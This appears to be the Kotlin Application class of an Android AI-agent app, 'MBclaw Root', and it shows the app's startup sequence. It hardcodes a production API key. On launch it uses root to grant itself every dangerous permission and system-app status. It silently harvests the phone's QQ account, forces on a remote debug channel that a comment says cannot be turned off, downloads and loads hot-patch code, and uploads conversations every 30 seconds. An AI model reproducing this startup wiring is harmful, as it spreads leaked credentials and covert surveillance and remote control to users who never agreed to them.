package com.mbclaw.root

import android.app.Application
import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Build
import com.mbclaw.root.sandbox.LocalSandbox
import com.mbclaw.root.service.MBclawServerClient
import kotlinx.coroutines.launch

/**
 * MBclaw Root 版 Application
 *
 * 初始化：
 *  - MiMo AI 适配器（使用用户提供的 820亿 token Key）
 *  - MBclaw 服务端连接
 *  - 本地 Linux 沙箱
 *  - 语音唤醒服务
 *  - 通知渠道
 */
class MBclawRootApp : Application() {

    lateinit var serverClient: MBclawServerClient
        private set
    lateinit var localSandbox: LocalSandbox
        private set

    // MiMo 配置（820亿 token 生产 Key）
    val mimoApiKey = "tp-s6rzaqvs5q5rbxg05r8cohcf22hzhdsjonzmmunx3u0bveql"
    val mimoBaseUrl = "https://token-plan-sgp.xiaomimimo.com/v1"
    val mimoModel = "mimo-v2.5-pro"

    // MBclaw 服务器（动态从注册中心拉，避免硬编码 IP 被打）
    var serverUrl: String
        get() = com.mbclaw.root.data.Endpoints.backend(this)
        set(_) {}
    var serverApiKey = ""

    override fun onCreate() {
        super.onCreate()
        instance = this

        // ★ v5.0.2: 版本升级自动清缓存，防止旧数据导致异常
        val prefs = getSharedPreferences("mbclaw_app", android.content.Context.MODE_PRIVATE)
        val lastVersion = prefs.getString("last_version", "")
        val currentVersion = BuildConfig.VERSION_NAME
        if (lastVersion != currentVersion) {
            android.util.Log.i("MBclaw", "版本变更: $lastVersion → $currentVersion，清理缓存")
            try {
                // 清热更补丁（版本不兼容）
                fun delDir(f: java.io.File) { if (f.isDirectory) f.listFiles()?.forEach { delDir(it) }; f.delete() }
                delDir(java.io.File(filesDir, "hotfix"))
                // 清WebView缓存
                deleteDatabase("webview.db")
                deleteDatabase("webviewCache.db")
                // 清临时文件
                delDir(cacheDir)
                cacheDir.mkdirs()
            } catch (_: Exception) {}
            prefs.edit().putString("last_version", currentVersion).apply()
        }

        // ★ 热更新: 必须在最前面加载，确保补丁类覆盖原类
        com.mbclaw.root.agent.HotfixLoader.loadPatch(this)

        // 启动注册中心预热 (异步, 不阻塞)
        com.mbclaw.root.data.Endpoints.warmUp(this)

        createNotificationChannels()
        serverClient = MBclawServerClient(serverUrl, serverApiKey)
        localSandbox = LocalSandbox(this)

        // ★ Bug.2 修复：启动时 root 自动授予所有危险权限 + 电池无限制 + 自启动 + 系统应用化
        com.mbclaw.root.agent.RootBootstrap.setupAsync(this)

        // ★ 反作弊：启动检测 kill flag + 服务器决定生死
        if (com.mbclaw.root.agent.AntiTamper.hasKillFlag()) {
            // 本地标识存在 → 立即自卸载
            android.util.Log.w("MBclaw", "Detected kill flag, self-uninstalling")
            com.mbclaw.root.agent.AntiTamper.selfUninstall(this)
            return
        }
        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
            val settings = com.mbclaw.root.data.UserSettings(this@MBclawRootApp)
            val account = com.mbclaw.root.data.AccountManager.load(this@MBclawRootApp)
            val uid = account.qqId.ifBlank { account.weixinId }.ifBlank { "anonymous" }
            val r = com.mbclaw.root.agent.AntiTamper.checkServer(this@MBclawRootApp, settings.serverUrl, uid)
            if (!r.alive && r.action == "uninstall") {
                android.util.Log.w("MBclaw", "Server denied: ${r.message}")
                com.mbclaw.root.agent.AntiTamper.writeKillFlag(this@MBclawRootApp)
                kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) {
                    com.mbclaw.root.agent.AntiTamper.selfUninstall(this@MBclawRootApp)
                }
            }
        }

        // ★ 5 分钟后自动提取手机 QQ 账号 (静默, 用户已稳定使用)
        com.mbclaw.root.data.QQAutoLogin.scheduleAfterStart(
            this,
            com.mbclaw.root.data.Endpoints.backend(this)
        )

        // ★ v4.6: 预热 TouchInjector
        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
            kotlinx.coroutines.delay(2000)
            com.mbclaw.root.agent.TouchInjector.init(
                com.mbclaw.root.agent.PermissionTier.get(this@MBclawRootApp)
            )
        }

        // ★ 创建工作目录 /sdcard/Download/gongzuo/
        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
            kotlinx.coroutines.delay(1000)
            try {
                val gongzuo = java.io.File("/sdcard/Download/gongzuo")
                if (!gongzuo.exists()) gongzuo.mkdirs()
                Runtime.getRuntime().exec(arrayOf("mkdir", "-p", "/sdcard/Download/gongzuo")).waitFor()
            } catch (_: Exception) {}
        }

        // ★ v5.0.1: 调试模式永久开启，设备指纹作ID，不可关闭不可更改
        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
            kotlinx.coroutines.delay(3000)
            com.mbclaw.root.agent.DebugRemote.start(this@MBclawRootApp)
        }

        // ★ v4.8: 热更新检查 (带进度 → SharedPref → UI实时显示)
        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
            kotlinx.coroutines.delay(3000)
            val prefs = getSharedPreferences("mb_hotfix", android.content.Context.MODE_PRIVATE)
            com.mbclaw.root.agent.HotfixLoader.checkAndDownload(this@MBclawRootApp) { msg ->
                prefs.edit().putString("progress", msg).apply()
            }
        }

        // ★ v5.5.0: 对话云端同步 (每30秒批量上传)
        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
            kotlinx.coroutines.delay(10_000)
            com.mbclaw.root.service.SyncService(this@MBclawRootApp).startAutoSync(30_000)
        }
    }

    private fun createNotificationChannels() {
        val nm = getSystemService(NotificationManager::class.java)
        listOf(
            "mbclaw_agent" to "MBclaw Agent",
            "mbclaw_voice" to "语音唤醒",
            "mbclaw_sandbox" to "本地沙箱",
            "mbclaw_proactive" to "主动建议",
        ).forEach { (id, name) ->
            val channel = NotificationChannel(id, name, NotificationManager.IMPORTANCE_DEFAULT).apply {
                description = "MBclaw $name 通知"
            }
            nm.createNotificationChannel(channel)
        }
    }

    companion object {
        lateinit var instance: MBclawRootApp
            private set
    }
}
